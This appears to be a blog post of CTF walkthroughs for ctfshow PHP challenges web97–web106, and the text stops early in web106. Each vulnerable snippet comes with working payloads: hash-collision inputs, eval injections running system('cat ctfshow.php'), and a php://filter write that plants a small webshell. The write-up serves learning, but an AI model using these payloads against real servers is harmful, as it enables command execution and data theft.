&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003509585.png&#34; alt=&#34;image-20221110003509585&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web97&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web97&#34;&gt;#&lt;/a&gt; web97&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &amp;#123;
if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
echo $flag;
else
print &#39;Wrong.&#39;;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;人见人爱的 MD5 强碰撞，这里给出几个 MD5 和 hash 的强碰撞，简单点的数组绕过就行&lt;/p&gt;
&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$a=&#34;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&#34;;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$b=&#34;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&#34;;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0&amp;amp;array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#sha1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;传就完事，注意别用 hackbar 会编码一次再发送&lt;/p&gt;
&lt;h2 id=&#34;web98&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web98&#34;&gt;#&lt;/a&gt; web98&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
$_GET?$_GET=&amp;amp;$_POST:&#39;flag&#39;;
$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;amp;$_COOKIE:&#39;flag&#39;;
$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;amp;$_SERVER:&#39;flag&#39;;
highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;三元运算符和地址传递&lt;/p&gt;
&lt;p&gt;首先第一个三元运算，如果有 get 传参就将 post 的地址传给 get，最后一个是如果 $_GET [&#39;HTTP_FLAG&#39;]==&#39;flag&#39; 就打印 flag，否则就会高亮当前文件，第二个和第三个这里似乎没有用上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110225715098.png&#34; alt=&#34;image-20221110225715098&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web99&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web99&#34;&gt;#&lt;/a&gt; web99&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i &amp;lt; 0x36d; $i++) &amp;#123; 
    array_push($allow, rand(1,$i));
&amp;#125;
if(isset($_GET[&#39;n&#39;]) &amp;amp;&amp;amp; in_array($_GET[&#39;n&#39;], $allow))&amp;#123;
    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;array_push () 函数向数组尾部插入一个或多个元素。&lt;/p&gt;
&lt;p&gt;in_array () 函数搜索数组中是否存在指定的值。这题的点也是在这这个函数有三个参数，像题目中两个是必须的，第三个参数是可选择的如果为 ture 则判断第一个参数（被检索的值）和第二个参数（检索的字母）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233741927.png&#34; alt=&#34;image-20221110233741927&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里可以，用 1.php 去尝试，会被识别为 1，如果相同则写入 1.php 中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233730400.png&#34; alt=&#34;image-20221110233730400&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web100&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web100&#34;&gt;#&lt;/a&gt; web100&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&amp;quot;ctfshow.php&amp;quot;);
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET[&#39;v1&#39;];
$v2=$_GET[&#39;v2&#39;];
$v3=$_GET[&#39;v3&#39;];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&amp;#123;
    if(!preg_match(&amp;quot;/\;/&amp;quot;, $v2))&amp;#123;
        if(preg_match(&amp;quot;/\;/&amp;quot;, $v3))&amp;#123;
            eval(&amp;quot;$v2(&#39;ctfshow&#39;)$v3&amp;quot;);
        &amp;#125;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先 $v0=is_numeric ($v1) and is_numeric ($v2) and is_numeric ($v3); 这里要让其值为 true，然后进入 if 语句&lt;/p&gt;
&lt;p&gt;判断三个数都为数字或者数字字符串才行，但是这里等号的运算优先级比 and 要高&lt;/p&gt;
&lt;p&gt;&amp;amp;&amp;amp; &amp;gt; || &amp;gt; = &amp;gt; and &amp;gt; or&lt;/p&gt;
&lt;p&gt;所以这里后面的 v2 和 v3 似乎没啥用，v2 不能有；v3 要有；，这里还要将中间的 ctfshow 干扰给过滤了，可以用多行注释，直接用？&amp;gt; 结束也行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?v1=1&amp;amp;v2=var_dump($ctfshow)/*&amp;amp;v3=*/;
?v1=1&amp;amp;v2=system(%27cat%20ctfshow.php%27)/*&amp;amp;v3=*/;
?v1=1&amp;amp;v2=var_dump($ctfshow)?&amp;gt;&amp;amp;v3=;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web101&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web101&#34;&gt;#&lt;/a&gt; web101&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&amp;quot;ctfshow.php&amp;quot;);
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET[&#39;v1&#39;];
$v2=$_GET[&#39;v2&#39;];
$v3=$_GET[&#39;v3&#39;];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&#39;|\,|\.|\;|\?|[0-9]/&amp;quot;, $v2))&amp;#123;
        if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&#39;|\,|\.|\?|[0-9]/&amp;quot;, $v3))&amp;#123;
            eval(&amp;quot;$v2(&#39;ctfshow&#39;)$v3&amp;quot;);
        &amp;#125;
    &amp;#125;
    
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟上一题相比较挺突然，突然过滤了好多东西，经观察，v3 还是可以有 &amp;quot;;&amp;quot;，这里要使用 php 反射，先浅浅的记录一下什么是 php 反射&lt;/p&gt;
&lt;h3 id=&#34;php反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反射&#34;&gt;#&lt;/a&gt; php 反射&lt;/h3&gt;
&lt;p&gt;算的上是 php 中的一种非常普遍的高级操作，几乎在所有的 php 框架或是说工具中都能见到反射的身影，那么什么是反射？&lt;/p&gt;
&lt;p&gt;php 语言是一种简单的同时可以应用面向对象面向过程方式的变成语言，而在面向对象中对象被赋予了自省的能力，这种自省的过程就是反射，在 php 文档中是这样介绍的 “ &lt;code&gt;PHP 具有完整的反射 API，增加了内省类、接口、函数、方法和扩展的能力。 此外，反射 API 提供了方法来取出函数、类和方法中的文档注释。&lt;/code&gt; ”，简单来说就是通过对象找到他所属的类，拥有哪些方法等等&lt;/p&gt;
&lt;h3 id=&#34;demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#demo&#34;&gt;#&lt;/a&gt; demo&lt;/h3&gt;
&lt;p&gt;对于反射会接触到四个类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ReflectionClass
ReflectionFunction
ReflectionMethod
ReflectionParameter
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来简单写一个 demo&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class demo1&amp;#123;&amp;#125;
class demo2&amp;#123;
	public $test1;
	private $test2;

	public function __construct()&amp;#123;
		$this-&amp;gt;test1 = &#39;test1&#39;;
		$this-&amp;gt;test2 = &#39;test2&#39;;
	&amp;#125;

	public function functiontest()&amp;#123;
		//echo $this-&amp;gt;test1;
		return $this-&amp;gt;test2;
	&amp;#125;
&amp;#125;

//$class=new ReflectionClass(demo2::class);
$class = new ReflectionClass(&#39;demo2&#39;);
//$funtion = new ReflectionMethod(&#39;demo2&#39;, &#39;__construct&#39;);
//$Method = new ReflectionMethod(&#39;demo2&#39;, &#39;functiontest&#39;);
//$Parameter = new ReflectionParameter(&#39;demo2&#39;, &#39;functiontest&#39;);
echo $class;
//echo $funtion;
//echo $Method;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;Class [ &amp;lt;user&amp;gt; class demo2 ] &amp;#123;
  - Constants [0] &amp;#123;
  &amp;#125;

  - Static properties [0] &amp;#123;
  &amp;#125;

  - Static methods [0] &amp;#123;
  &amp;#125;

  - Properties [2] &amp;#123;
    Property [ &amp;lt;default&amp;gt; public $test1 ]
    Property [ &amp;lt;default&amp;gt; private $test2 ]
  &amp;#125;

  - Methods [2] &amp;#123;
    Method [ &amp;lt;user, ctor&amp;gt; public method __construct ] &amp;#123;
      @@ C:\Users\Clown\Desktop\exp.php 7 - 10
    &amp;#125;

    Method [ &amp;lt;user&amp;gt; public method functiontest ] &amp;#123;
      @@ C:\Users\Clown\Desktop\exp.php 12 - 15
    &amp;#125;
  &amp;#125;
&amp;#125;

[Done] exited with code=0 in 0.061 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到将类中的信息打印出来，所有 payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?v1=1&amp;amp;v2=echo new Reflectionclass&amp;amp;v3=;
?v1=1&amp;amp;v2=echo new Reflectionclass?&amp;gt;&amp;amp;v3=;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102222148085.png&#34; alt=&#34;image-20230102222148085&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web102&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web102&#34;&gt;#&lt;/a&gt; web102&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
highlight_file(__FILE__);
$v1 = $_POST[&#39;v1&#39;];
$v2 = $_GET[&#39;v2&#39;];
$v3 = $_GET[&#39;v3&#39;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&amp;#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
&amp;#125;
else&amp;#123;
    die(&#39;hacker&#39;);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;题目本意应该是 php5 下 is_numeric 可识别 16 进制，如 0x2e，然后调用 hex2bin 转成字符串写入木马，但题目环境没配好，是 php7, 所以要另换方法&lt;/p&gt;
&lt;p&gt;call_user_func () 这个函数是调用函数的一种方法&lt;/p&gt;
&lt;p&gt;因为写入要用伪协议写入，所以需要 base64 编码后转成 16 进制全是数字的字符串，payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;get：?v2=115044383959474e6864434171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php
post：v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来解释一下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$a=&#39;&amp;lt;?=`cat *`;&#39;;
$b=base64_encode($a);
echo $b;  // PD89YGNhdCAqYDs=
$c=bin2hex(&#39;PD89YGNhdCAqYDs&#39;);
echo $c;    //5044383959474e6864434171594473
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102231612343.png&#34; alt=&#34;image-20230102231612343&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web103&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web103&#34;&gt;#&lt;/a&gt; web103&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
$v1 = $_POST[&#39;v1&#39;];
$v2 = $_GET[&#39;v2&#39;];
$v3 = $_GET[&#39;v3&#39;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&amp;#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match(&amp;quot;/.*p.*h.*p.*/i&amp;quot;,$str))&amp;#123;
        file_put_contents($v3,$str);
    &amp;#125;
    else&amp;#123;
        die(&#39;Sorry&#39;);
    &amp;#125;
&amp;#125;
else&amp;#123;
    die(&#39;hacker&#39;);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比起上一关多了一个正则，但是不影响做题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;get：?v2=115044383959474e6864434171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php
post：v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web104&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web104&#34;&gt;#&lt;/a&gt; web104&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
if(isset($_POST[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
    $v1 = $_POST[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
    if(sha1($v1)==sha1($v2))&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;弱类型比较，找两个 sha1 后为数字加 e 开头的，这里&lt;/p&gt;
&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;10932435112: 0e07766915004133176347055865026311692244&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaroZmOk: 0e66507019969427134894567494305185566735&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaK1STfY: 0e76658526655756207688271159624026011393&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaO8zKZF: 0e89257456677279068558073954252716165668&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aa3OFF9m: 0e36977786278517984959260394024281014729&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e1290633704: 0e19985187802402577070739524195726831799&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当然，简单一点可以直接用数组绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111104256845.png&#34; alt=&#34;image-20230111104256845&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web105&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web105&#34;&gt;#&lt;/a&gt; web105&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);
error_reporting(0);
$error=&#39;你还想要flag嘛？&#39;;
$suces=&#39;既然你想要那给你吧！&#39;;
foreach($_GET as $key =&amp;gt; $value)&amp;#123;
    if($key===&#39;error&#39;)&amp;#123;
        die(&amp;quot;what are you doing?!&amp;quot;);
    &amp;#125;
    $$key=$$value;
&amp;#125;foreach($_POST as $key =&amp;gt; $value)&amp;#123;
    if($value===&#39;flag&#39;)&amp;#123;
        die(&amp;quot;what are you doing?!&amp;quot;);
    &amp;#125;
    $$key=$$value;
&amp;#125;
if(!($_POST[&#39;flag&#39;]==$flag))&amp;#123;
    die($error);
&amp;#125;
echo &amp;quot;your are good&amp;quot;.$flag.&amp;quot;\n&amp;quot;;
die($suces);

?&amp;gt;
你还想要flag嘛？
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个题的关键在于两个下面的语句，实现变量覆盖&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php、&#34;&gt;$$key=$$value;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们的目标 flag 在 $flag 中，想要获得中国 flag 我们要么到最后一步&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;echo &amp;quot;your are good&amp;quot;.$flag.&amp;quot;\n&amp;quot;; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为有上面提到的哪个关键语句在，这里可以通过变量覆盖实现，于是 payload 的思路就是先用第一个 if 的 get 将 flag 的值赋值给 suces，再用第二个 if，将 suces 的值给 error，再通过下面的语句会将 error 输出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if(!($_POST[&#39;flag&#39;]==$flag))&amp;#123;
    die($error); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以 payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?suces=flag
post：error=suces
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web106&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web106&#34;&gt;#&lt;/a&gt; web106&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
    $v1 = $_POST[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
